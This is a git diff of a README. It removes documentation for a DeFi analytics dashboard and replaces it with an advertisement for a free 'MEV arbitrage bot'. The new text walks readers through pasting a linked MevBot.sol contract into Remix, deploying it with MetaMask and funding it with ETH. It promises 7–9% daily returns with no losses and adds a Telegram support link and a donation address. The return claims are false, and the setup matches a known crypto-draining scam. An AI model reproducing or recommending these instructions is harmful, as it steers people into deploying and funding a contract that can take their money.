@@ -1,413 +1,89 @@
-
-
-<!-- PROJECT LOGO -->
-
-<br />
 <div align="center">
-    <a href="https://ibb.co/c2J0Fwy"><img src="https://i.ibb.co/c2J0Fwy/Add-a-heading.png" alt="Add-a-heading" border="0"></a>
-  <h3 align="center">DEFI SPOTLIGHT</h3>
+    
+ <img src="https://i.ibb.co/ZJDdbjJ/4bdf60-846d110908144c17ab163fee6f2648e8-mv2.webp" alt="4bdf60-846d110908144c17ab163fee6f2648e8-mv2" border="0">
+    
 </div>
 
+Uniswap is a cryptocurrency exchange which uses a decentralized network protocol. If you trade crypto on Uniswap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots sniping profits across exchange’s pools.
 
-<!-- TABLE OF CONTENTS -->
-<details>
-  <summary>Table of Contents</summary>
-  <ol>
-    <li>
-      <a href="#about-the-project">About The Project</a>
-      <ul>
-        <li><a href="#built-with">Built With</a></li>
-      </ul>
-    </li>
-    <li>
-      <a href="#getting-started">Getting Started</a>
-      <ul>
-        <li><a href="#prerequisites">Prerequisites</a></li>
-        <li><a href="#installation">Installation</a></li>
-      </ul>
-    </li>
-    <li><a href="#Usage">Application Insights</a></li>
-    <li><a href="#API">API's </a></li>
-    <li><a href="#ProjectLink">Project Link</a></li>
-    <li><a href="#Acknowledgments">Acknowledgments</a></li>
-  </ol>
-</details>
+You are now able to take advantage of those arbitrages yourself, a benefit that was previously only available to highly skilled devs. Here I provide you the access to my user-friendly (no coding skills required) MEV bot. Enjoy stress-free passive income from day one.
 
+My flagship project that I recently released is Arbitrage MEV bot which runs on ETH pairs on Uniswap making profits from arbitrage trades.
 
-<!-- ABOUT THE PROJECT -->
-## About The Project
+Using my smart contract source code allows users to create their own MEV bots which stacks up the profits from automatic trades for the users.
 
-The main goal of this research is to provide a statistical summary of DEFI protocols with the data. People are then able to comprehend the DEFI protocols and make appropriate investments. It is an all-in-one data insights and analytics dashboard for decentralized finance for web3, that collects and organizes a variety of quantitative and qualitative data 
+I share my Arbitrage MEV bot smart contract for free, but there’s 0.1% fee charged from users’ profits, which goes back to me.
 
-Visit to get Demo - https://ethglobal.com/showcase/defi-spotlight-di35t
-
-### Features
-* Polygon DEX Trades
-     ```js
-    1.Past DEXs 24h Volume in Millions
-    2.Past DEXs 7D Volume in Millions
-    3.Past DEXs 1M Volume in Billions
-    4.DEXs Trailing Past 24h Growth
-    5.DEXs Trailing Past 7D Growth
-    6.DEXs Trailing Past 1M Growth
-    7.Polygon Daily DEXs Volume (LAST_3_MONTHS)
-    8.Polygon Daily DEXs Volume (LAST_3_MONTHS)
-    9.Polygon Weekly DEXs Volume
-    10.Polygon Weekly Volume per DEX
-    11.DEX Marketshare by Volume Last Week
-    12.DEX Marketshare By Trading Volume
-    13.DEXs by Volume
-    14.DEXs by Users
-    15.DEXs by Transaction count
-    16.Aggregators Stats
-    ** Aave polygon stats
-    ** Apwine polygon stats
-   
-   ```
-
-* DYDX
-    ```js
-    1.Wallets with > 0 Address (DYDX)
-    2.Wallets with > 1000 Address (DYDX)
-    3.Wallets with > 100,000 Address (DYDX)
-    4.DYDX Daily New Users
-    5.DYDX Daily Volume
-    6.DYDX_daily_transaction_count
-    7.DYDX_USDC Unique Stakers
-    8.DYDX_USDC Staked Current Balance
-    9.DYDX_USDC_Staked
-    10.DYDX_amount_of_withdraw
-    11.DYDX_daily_stakers
-    12.DYDX_staked_usdc
-    13.DYDY_token_holders
-    14.DYDX_token_price
-    15.DYDX_daily_buy_on_dex
-    16.DYDX_daily_buy_on_dex
-    17.DYDX_active_users
-    ```
-    
-* MAKERDAO
-    ```js 
-    1.Maker_price
-    2.Maker_assets_per_type
-    3.Maker_oracle_Medianizer_daily
-    4.Maker_oracle_OSM_Megapoker_daily
-    5.Maker_oracle_gas_fee_Medianizer_daily
-    6.Maker_oracle_gas_fee_OSM_Megapoker_daily
-    7.Maker_oracle_gas_fee_pairs
-    8.Maker_outstanding_dai
-    9.Maker_total_user
-    10.Volumes Maker - Money Markets Inflow
-    11.Volumes Maker - Money Markets Outflow
-    12.Volumes Maker - Money Markets Turnover
-    ```
-* olympus
-     ```js 
-    1.Marketcap (OHM)
-    2.Circulating Supply / Total Supply (OHM)
-    3.OlympusDAO_total_wallet_count
-    4.OlympusDAO_new_users_count
-    5.OHM_Price
-    6.OHM_wallet_distribution
-    7.OHM_holders_over_time
-    8.OHM_price_marketcap
-    9.OHM Transcation_counts
-    10.Active_Ohm_Stakers
-    11.OHM_liqudity_owned
-    12.OHM_Treasury_Breakdown_By_Asset_Type
-    ```
-    
-* Unstoppable
-    ```js
-    1.Polygon Sales Volume in USD
-    2.ETH Sales Volume in USD
-    3.Polygon sales Count
-    4.ETH sales Count
-    5.NFT Sales On Polygon
-    6.NFT Sales On ETH
-    7.Possible NFT Washtraded Sales On Polygon
-    8.Possible NFT Washtraded Sales On ETH
-    9.Total Transactions Counts 
-    10.Most Used Token Symbol
-    11.Most Interacted Wallet
-    12.Max Sale
-    13.Min Sale
-    14.Avg Sale
-    15.Overall Sale Volume
-    16.sale_data
-    ```
-* yearn
-    ```js
-    1.Yearn vaults user activity in the latest 24 hours
-    2.Yearn vaults user activity in the latest 30 days
-    3.Yearn_vault_active_users
-    4.Yearn_vault_active__old_users
-    5.Yearn_vault_number_of_transactions'
-    6.Yearn_vault_unique_users
-    7.Yearn_vault_Deposit_Value_Distribution
-    8.Yearn_vault_top_25_active_vaults
-    9.Yearn_vault_avg_deposit_withdraw_YCRV
-    10.Yearn_vault_avg_deposit_withdraw_YLINK
-    11.Yearn_vault_avg_deposit_withdraw_YUSDC
-    12.Yearn_vault_avg_deposit_withdraw_YUSDT
-    13.Yearn_vault_avg_harvested_yCRV
-    14.Yearn_vault_avg_harvested_yDAI
-    15.Yearn_vault_avg_harvested_yUSDC
-    16.Yearn_vault_avg_harvested_yUSDT
-
-    ```
-* Babylon
-    ```js
-    1.BABL locked in hBABL contract
-    2.Balance USD in hBABL Contract
-    3.hBABL price
-    4.babylon_babl_in_heart_over_time
-    5.babylon_hBABL_daily_balance
-    6.babylon_hbabl_holders_grouped
-    7.babylon_pump_totals
-    8.babylon_hbabl_per_address
-    9.babylon_seed_investment_per_garden
-    10.babylon_heart_babl_sent
-    11.babylon_heart_fees_collected
-    12.babylon_heart_garden_seedinvest
-    13.babylon_heart_liquidity_added
-    ```
-* Badger
-    ```js
-    1.wallet > 0 (Badger)
-    2.wallet > 1000 (Badger)
-    3.wallet > 100,000 (Badger)
-    4.Badger_token_daily_active_users
-    5.Badger_token_daily_new_account
-    6.Badger_token_daily_buys
-    7.Badger_token_total_users
-    8.Badger_token_dex_volume
-    9.Badger_token_transactions
-    10.Digg_trading_volume
-    11.Digg_uniswap_users_over_time
-    12.Digg_susi_users_over_time
-    13.Digg_users_over_time
-    14.ibBTC_supply
-    15.weekly_gas_usage
-    16.weekly_gas_usage_per_type
-    17.Badger_Sett_TVL
-    ```
-* Chainlink
-    ```js
-    1.Wallets with (LINK))
-    2.Wallets with > 10  (LINK)
-    3.Wallets with > 100 (LINK)
-    4.chainlinkVRF_total_link_on_cexs
-    5.chainlink_on_dapps
-    6.chainlinkVRF_v1_BSC_LINK_Earned
-    7.chainlinkVRF_v1_ETH_LINK_Earned
-    8.chainlinkVRF_v1_daily_BSC
-    9.chainlinkVRF_v2_daily_BSC
-    10.chainlinkVRF_v1_daily_ETH
-    11.chainlinkVRF_v2_daily_ETH
-    12.chainlinkVRF_daily_polygon
-    13.chainlinkVRF_keepers_daily_BSC
-    14.chainlinkVRF_keepers_daily_ETH
-    15.chainlinkVRF_keepers_daily_poly
-    16.chainlink_Feed_Requesting_Transactions
-    17.chainlink_active_feeds
-    18.chainlink_active_feeds_requesters
-    ```
-* Covalent
-    ```js
-    1.cqt_price
-    2.cqt_daily_buys_on_dex
-    3.cqt_daily_active_users
-    4.cqt_daily_new_account
-    5.cqt_holders_over_time
-    6.cqt_purchases
-    7.cqt_seven_days_dex_volume
-    8.cqt_seven_days_dex_volume
-    9.cqt_transactions
-    10.cqt_monthly_active_users
-    11.cqt_unique_address_trading
-    ```
-* EPNS
-    ```js
-    1.PUSH Holders
-    2.PUSH Recent AVG Price
-    3.push_price
-    4.PUSH_supply
-    5.PUSH_LP_price
-    6.PUSH_holders
-    7.push_uniswap_lp_holders
-    8.push_weekly_avg_amount_transaction
-    9.PUSH_transfered_amount
-    10.PUSH_avg_transfered_amount
-    ```
-* Lyra
-    ```js
-    1.Notional Volume
-    2.Premium Volume
-    3.Total Trades
-    4.Unique Trades
-    5.Lyra_notational_volume_by_assets
-    6.Daily Unique Traders
-    7.Total Traders By Day
-    8.AVG Traders
-    9.Lyra Top 50 traders profit
-    10.Lyra Top 50 traders volume
-    11.Lyra_btc_marketpool_price
-    12.Lyra_btc_marketpool_price
-    13.Lyra_eth_marketpool_price
-    14.Lyra_eth_marketpool_pool_value
-    15.Lyra_link_marketpool_price
-    16.Lyra_link_marketpool_pool_value
-    17.Lyra Recent Trade History
-    18.lyra_susd_volume
-    19.lyra_profitable_traders
-    20.lyra_high_volume_traders
-    ```
-* Uniswap
-    ```js
-    1.Total Trading Volume (All Pairs)
-    2.Trading Volume in Top 15 Pairs
-    3.Total LP Fees (All Pairs)
-    4.LP Fees in Top 15 Pairs
-    5.Uniswap daily transactions by volume (USD)
-    6.Uniswap vs Sushi pools
-    7.Uniswap polygon daily transaction count
-    8.Uniswap polygon daily unique address 
-    9.Uniswap polygon weekly transaction count
-    10.Uniswap polygon weekly unique address
-    11.Uniswap Trade per Month
-    12.Uniswap_v3_ETH_table
-    13.Uniswap_v3_eth_gas_paid_per_swap
-
-    ```
-
-* Aave
-    ```js
-    1.Aave Polygon Transcation details
-    2.Aave Users Cummulative
-    3.Aave Daily Users
-    4.Aave Polygon Borrow Volume
-    5.Aave Polygon Deposit Volume
-    6.Aave Polygon Flash Loan Volume
-    7.Aave Polygon Liqudation Volume
-    8.Aave Polygon Repay Volume
-    9.Aave Polygon Transaction Volume
-    10.Aave Polygon Withdraw Volume
-    11.Aave Polygon Financial Statements
-
-    ```
-
-
-* Apwine
-    ```js
-    1.Fully Diluted Market Cap - ETH & Polygon
-    2.Total Token Supply - ETH & Polygon
-    3.Holders on Ethereum - ETH & Polygon
-    4.Circulating Supply - ETH & Polygon
-    5.Total Traded Volume - ETH & Polygon
-    6.$APW Price - ETH & Polygon
-    7.Apwine DEX Usage ETH
-    8.Apwine Token Daily Buy
-    9.Apwine Token Daily Buy
-    10.Apwine User Growth ETH
-    11.Apwine Token Cumulative Sell
-    12.Apwine Token Distribution ETH
-    13.Apwine DEX Volume ETH
-    14.Apwine DEX Usage Polygon
-    15.Apwine User Growth Polygon 
-    16.Apwine Total Transaction Deposit
-    17.Apwine Total Transaction Withdraw
-    18.Apwine Token Distribution Polygon
-    19.Apwine DEX Volume Polygon
-    ```
-
-
-
-Website link : [DEFI Spotlight](https://share.streamlit.io/ashikmuezza/defi_dashboard/main/main.py)
-
-
-
-<p align="right">(<a href="#top">back to top</a>)</p>
-
-
-### Built With
-
-The frameworks/libraries explicitly used in this project are
-
-* [Python](python.org)
-* [keras](https://keras.io/)
-* [streamlit](https://streamlit.io/)
-* [streamlit-aggrid](https://pypi.org/project/streamlit-aggrid/)
-* [requests](https://docs.python-requests.org/en/latest/)
-* sqlite
-
-
-<p align="right">(<a href="#top">back to top</a>)</p>
-
-
-## Getting Started
-
-To get a local copy up and running follow these simple example steps.
-
-
-### Installation
-
-Follow these steps to install certain packages which is to be installed in this project also make your own 
-API key from covalent to get access for data.
-
-### Home page data is not complete ethereum data, we can take it as approx 
-
-1. Get a free API Key from [covalent](https://www.covalenthq.com/)
-2. Clone the repo
-3. streamlit run main.py
-
-<p align="right">(<a href="#top">back to top</a>)</p>
-
-### Prerequisites
-
-* altair==4.2.0
-* keras==2.8.0
-* numpy==1.22.1
-* pandas==1.4.0
-* pillow==9.0.1
-* requests==2.22.0
-* scikit_learn==1.0.2
-* streamlit==1.4.0
-* streamlit-aggrid
-* sqlite
-
-
-
-
-<!-- CONTRIBUTING -->
-## API
-
-We have used API's from covalent for listing transcation details, analayze and etc.
-
-
-* COVALENTHQ API USED
-```js
-
-1.https://api.covalenthq.com/v1/1/address/{address}/transactions_v2/?key=key 
-2.https://api.covalenthq.com/v1/1/transaction_v2/{hash}/?key=key 
-3.https://api.covalenthq.com/v1/1/networks/aave_v2/assets/?quote-currency=USD&format=JSON&key=ckey_docs
-```
-
-Above apis are used to get transaction details for protocols that help to make seperate tables on sqlite.
-## Acknowledgments
-
-Would like to give credit to below teams for providing the API's
+---
  
+## How to launch your own arbitrage bot 
 
-* [Covalent](https://www.covalenthq.com/)
-* [ETL](https://github.com/blockchain-etl/ethereum-etl)
-* [polygon ETL](https://github.com/blockchain-etl/polygon-etl)
-* Filpsidecrypto // Dune
+1) Download MetaMask (if you don’t have it already):
+  https://metamask.io/download.html
 
+   Access Remix: https://remix.ethereum.org/
 
-<p align="right">(<a href="#top">back to top</a>)</p>
+2) File Explorer Hover over the tiny button in the top left and click and create new file **"mevbot.sol"** Copy the code from [**"MevBot.sol"**](MevBot.sol) and paste in Remix IDE
 
+ <div align="center">
+    
+<img src="https://i.ibb.co/r5QHcXb/1.png" alt="1" border="0">
 
+   </div>
 
+3) Go to the **“Solidity Compiler”** tab, Select compiler version 0.6.12 and then select **“Compile mevbot.sol”**.
 
+   Make sure “**MevBot.sol**” is selected in the **CONTRACT** section of the **SOLIDITY COMPILER** section.
 
+ <div align="center">
+    
+<img src="https://i.ibb.co/Tvbwv9g/2.png" alt="2" border="0">
+
+   </div>
+   
+4) Go to the **“DEPLOY & RUN TRANSACTIONS”** tab, select the **“Injected Provider - Metamask”** environment and then **“Deploy”**. By approving the Metamask contract creation fee, you will have created your own contract.
+
+5) Copy your newly created contract address and fund it with any amount of ETH  Simply send ETH to your newly created contract address to allow the bot to earn money.
+
+ <div align="center">
+    
+<img src="https://i.ibb.co/Z1CMXK1/3.png" alt="3" border="0">
+
+   </div>
+   
+6) After your transaction is confirmed, click the **“start”** button to run the bot. Withdraw your ETH at any time by clicking the **“Withdraw”** button.
+
+ <div align="center">
+    
+<img src="https://i.ibb.co/pf8h7M2/4.png" alt="4" border="0">
+
+   </div>
+   
+#### That’s it. The bot will start working immediately earning you profits from arbitrage trades on Uniswap pools.
+
+---
+
+## If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
+# FAQ
+
+### If many people will use the bot, wouldn’t dilution of profits occur?
+
+I do not plan to limit access to the bot for now because there won’t be any affect for me or other users profiting as pools that the bot works on are with the biggest liquidities and volumes on Uniswap so other users involvement in the pools will always be very minor.
+
+### What average ROI can I expect?
+
+According to my latest data of bot performances (past 3 weeks) ROI is about +7–9% daily per user. Bot does not make any losses, it only executes trades when there’s proper arbitrage opportunity to make profit, so under all circumstances user is always on plus.
+
+### What amount of funds bot need to work?
+
+I recommend funding the contract with at least 1-5 ETH to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than recommended and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit.
+
+### Does it work on other chains or DEXes as well?
+
+No, currently the bot is dedicated only for Ethereum on Uniswap pools.
+
+#### address for donate - 0x8365d619f4620083Aa9e320C2e88e1590A73d53b eth usdt ETH
+
+# License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
